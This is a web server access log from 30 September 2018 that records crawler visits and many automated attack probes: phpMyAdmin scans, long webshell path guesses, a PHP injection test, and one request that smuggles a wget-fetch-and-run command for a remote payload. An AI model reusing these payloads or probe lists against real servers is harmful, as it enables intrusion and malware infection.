IP,DATE,METHOD,URI,User Agent
"81.19.44.12","30/Sep/2018","GET","/console","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/","Firefox/57.0"

"208.80.194.30","30/Sep/2018","GET","/Jogos/app/tutorial.pdf","Safari/534.30"

"190.144.85.90","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"190.144.85.90","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"66.249.69.53","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.69.51","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"36.82.236.225","30/Sep/2018","GET","/",""-"

"66.249.69.120","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.69.120","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"116.58.239.126","30/Sep/2018","GET","/","Safari/537.36"

"185.215.234.118","30/Sep/2018","GET","/","Safari/537.36"

"201.57.59.5","30/Sep/2018","GET","/","Safari/537.36"

"186.103.199.252","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"186.103.199.252","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"103.78.181.203","30/Sep/2018","GET","/","Safari/537.36"

"159.203.196.79","30/Sep/2018","GET","/","Firefox/33.0"

"183.234.68.86","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"41.211.112.13","30/Sep/2018","GET","/","Safari/601.7.7"

"192.95.35.228","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"192.95.35.228","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"66.249.69.106","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.69.104","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"118.145.3.27","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"118.145.3.27","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"159.203.96.191","30/Sep/2018","GET","/","Safari/537.36"

"91.134.241.204","30/Sep/2018","POST","/?cmd=echo(344444443%2b1);","Firefox/32.0"

"123.145.23.223","30/Sep/2018","GET","http://www.epochtimes.com/","Firefox/45.0"

"116.252.2.233","30/Sep/2018","GET","http://www.minghui.org/","Safari/537.36"

"175.152.29.255","30/Sep/2018","CONNECT","www.baidu.com:443","librtmp/2.3"

"180.95.227.78","30/Sep/2018","CONNECT","www.voanews.com:443","librtmp/2.3"

"141.8.144.26","30/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"141.8.144.26","30/Sep/2018","GET","/","+http://yandex.com/bots)"

"141.8.143.175","30/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"93.158.166.135","30/Sep/2018","GET","/","+http://yandex.com/bots)"

"66.249.70.10","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.70.8","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"178.73.215.171","30/Sep/2018","GET","/",""-"

"84.214.150.146","30/Sep/2018","GET","/","Safari/601.7.7"

"103.60.167.118","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"103.60.167.118","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"120.24.48.143","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"120.24.48.143","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","PROPFIND","/",""-"

"114.6.34.194","30/Sep/2018","GET","/webdav/",""Mozilla/5.0"

"114.6.34.194","30/Sep/2018","GET","/help.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/java.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/_query.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/test.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/db_cts.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/db_pma.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/logon.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/help-e.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/license.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/log.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/hell.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/pmd_online.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/x.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/shell.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/htdocs.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/desktop.ini.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/z.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/lala.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/lala-dpr.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/wpo.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/text.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/wp-config.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstik.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstik2.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstiks.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstik-dpr.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/lol.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/uploader.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmd.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmx.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmv.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmdd.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/knal.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmd.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/shell.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/appserv.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/scripts/setup.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/scripts/db___.init.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/scripts/db___.init.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/plugins/weathermap/editor.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cacti/plugins/weathermap/editor.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","POST","/wuwu11.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xw1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/9678.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wc.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/s.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/w.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sheep.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qaq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db.init.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db_session.init.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db__.init.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wp-admins.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/m.php?pbid=open","1.0"

"114.6.34.194","30/Sep/2018","POST","/db_dataml.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db_desql.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/mx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wshell.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xshell.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/conflg.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/lindex.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/phpstudy.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/phpStudy.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/weixiao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/feixiang.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ak47.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ak48.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/yao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/defect.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/webslee.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/q.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/pe.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hm.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/cainiao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuoshou.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuo.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/aotu.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/cmd.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/bak.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/system.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/l6.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/l7.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/l8.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/q.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/56.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/mz.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/yumo.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/min.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wan.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wanan.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ssaa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/aw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/12.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hh.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ak.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ip.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/infoo.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qwe.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1213.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/post.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/h1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/test.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/3.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/phpinfi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/aaaa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/9510.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/python.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/default.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sean.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/app.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/help.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/tiandi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/miao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xz.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/linuxse.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuoindex.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zshmindex.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/tomcat.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ceshi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1hou.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ou2.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuos.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuoss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/boots.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/she.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/s.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/test.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/caonma.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wcp.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/u.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/uuu.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/2.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/core.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qaz.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sha.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ppx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/confg.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/conf1g.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ver.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hack.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/Ss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xxx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/92.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/z.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/x.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/nuoxi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/godkey.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/okokok.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/erwa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/pma.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ruyi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/51314.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/5201314.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/fusheng.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/general.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/repeat.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ldw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/api.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/s1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaodai.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hello.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xp.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/2.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/p.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/a.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/m.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/conf.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/123.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/HX.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/diy.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/666.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/777.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qwq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaoma.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaomae.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiaomar.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/data.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/log.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/fack.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/angge.php","1.0"

"114.6.34.194","30/Sep/2018","GET","/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pmd/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pma/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/PMA/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/PMA2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pmamy/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pmamy2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/mysql/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/db/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/dbadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/web/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/pma/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/PMA/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/mysql/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/mysql2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/admin/phpmyadmin2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/mysqladmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/mysql-admin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin0/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin1/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin-4.4.0/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/myadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/myadmin2/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/xampp/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyadmin_bak/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/www/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/tools/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin-old/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdminold/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin.old/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/pma-old/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/claroline/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/typo3/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpma/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/phpmyadmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/phpMyAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAbmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin__/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin+++---/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/v/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpmyadm1n/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdm1n/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/shaAdmin/index.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmion/index.php","Firefox/57.0"

"189.18.216.7","30/Sep/2018","GET","/","Safari/537.36"

"66.249.70.7","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"217.128.171.65","30/Sep/2018","GET","/shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo",""Gemini/2.0"

"111.231.190.181","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"111.231.190.181","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"190.102.146.26","30/Sep/2018","PROPFIND","/",""-"

"190.102.146.26","30/Sep/2018","GET","/webdav/",""Mozilla/5.0"

"190.102.146.26","30/Sep/2018","GET","/help.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/java.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/_query.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/test.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/db_cts.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/db_pma.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/logon.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/help-e.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/license.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/log.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/hell.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/pmd_online.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/x.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/shell.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/htdocs.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/desktop.ini.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/z.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/lala.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/lala-dpr.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/wpo.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/text.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/wp-config.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstik.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstik2.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstiks.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/muhstik-dpr.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/lol.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/uploader.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmd.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmx.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmv.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmdd.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/knal.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cmd.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/shell.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/appserv.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/scripts/setup.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpmyadmin/scripts/db___.init.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/phpMyAdmin/scripts/db___.init.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/plugins/weathermap/editor.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","GET","/cacti/plugins/weathermap/editor.php","Firefox/59.0"

"190.102.146.26","30/Sep/2018","POST","/wuwu11.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xw.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xw1.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/9678.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wc.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xx.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/s.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/w.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/sheep.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qaq.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db.init.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db_session.init.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db__.init.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wp-admins.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/m.php?pbid=open","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db_dataml.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db_desql.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/mx.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wshell.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xshell.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/qq.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/conflg.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/lindex.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/phpstudy.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/phpStudy.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/weixiao.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/feixiang.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ak47.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/ak48.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/xiao.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/yao.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/defect.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/webslee.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/q.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/pe.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/hm.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/cainiao.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/zuoshou.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/zuo.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/aotu.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/cmd.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/bak.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/system.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/l6.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/l7.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/l8.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/q.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/56.php","Trident/4.0)"

